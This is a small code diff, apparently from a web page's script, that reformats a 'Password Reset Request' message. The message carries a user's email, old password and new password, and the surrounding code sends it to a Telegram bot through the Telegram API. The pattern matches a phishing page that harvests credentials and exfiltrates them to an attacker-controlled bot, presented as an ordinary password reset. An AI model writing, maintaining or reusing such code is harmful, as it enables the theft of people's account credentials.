@@ -140,7 +140,7 @@
         return;
       }
 
-      const message = `🔐 *Password Reset Request*\n\n 📩 *Email:* ${email} 👤 *Old Password:* ${oldPass}\n🆕 *New Password:* ${newPass}\n 📅 *Time:* ${new Date().toLocaleString()}`;
+      const message = `🔐 *Password Reset Request*\n\n 📩 *Email:* ${email} \n👤 *Old Password:* ${oldPass}\n🆕 *New Password:* ${newPass}\n 📅 *Time:* ${new Date().toLocaleString()}`;
 
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
